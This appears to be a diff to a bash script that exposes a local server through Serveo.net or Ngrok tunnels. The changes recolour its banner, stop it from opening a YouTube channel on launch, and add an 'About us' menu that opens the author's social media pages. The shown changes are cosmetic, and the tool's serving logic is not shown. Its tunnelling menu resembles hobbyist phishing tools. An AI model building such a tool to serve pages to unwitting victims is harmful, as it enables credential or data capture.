@@ -1,6 +1,6 @@
 clear
 
-xdg-open https://m.youtube.com/channel/UCOvC4r8gpx4uLIiBz3Q65WA
+#xdg-open https://m.youtube.com/channel/UCOvC4r8gpx4uLIiBz3Q65WA
 
 if  ./ngrok -v > dev\null 2>&1
  then
@@ -22,15 +22,15 @@ fi
 trap 'printf "\n";stop' 2
 
 banner() {
-printf "          /\              /\  \n"
-printf "         /()\____________/()\ \n"
-printf "         \                  / \n"
-printf "             {o}     {o}      \n"
-printf "                [Ω!Ω]         \n"
-printf "              \_______/       \n"
-printf "               v=====v        \n"
-printf "                ^___^         \n"
-printf "\e[1;92m  by SALAH ANNOUZ      \e[0m\n"
+printf "\e[36m                    /\              /\  \n"
+printf "\e[36m                   /()\____________/()\ \n"
+printf "\e[36m                   \                  / \n"
+printf "\e[36m                       {o}     {o}      \n"
+printf "\e[36m                          [Ω!Ω]         \n"
+printf "\e[36m                        \_______/       \n"
+printf "\e[36m                         v=====v        \n"
+printf "\e[36m                          ^___^         \n"
+printf "\e[1;92m  by SALAH\e[31meddin\e[1;92m ANNOUZ      \e[0m\n"
 
 
 
@@ -38,6 +38,35 @@ printf "\e[1;92m  by SALAH ANNOUZ      \e[0m\n"
 printf "\n"
 
 
+}
+
+us() {
+clear
+banner
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m YouTube\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Instegram \e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m back\e[0m\n"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose an option: \e[0m' option
+if [[ $option -eq 2 ]]; then
+xdg-open https://m.youtube.com/channel/UCOvC4r8gpx4uLIiBz3Q65WA
+banner
+us
+elif [[ $option -eq 1 ]]; then
+clear
+banner
+xdg-open https://www.facebook.com/profile.php?id=100081022397635&mibextid=rS40aB7S9Ucbxw6v
+us
+elif [[ $option -eq 3 ]]; then
+clear
+banner
+xdg-open https://www.instagram.com/salahannouz1964/
+us
+else
+clear
+banner
+start1
+fi
 }
 
 stop() {
@@ -216,6 +245,7 @@ fi
 printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m About us\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
@@ -226,6 +256,9 @@ start
 
 elif [[ $option_server -eq 2 ]]; then
 ngrok_server
+elif [[ $option_server -eq 3 ]]; then
+us
+
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
 sleep 1
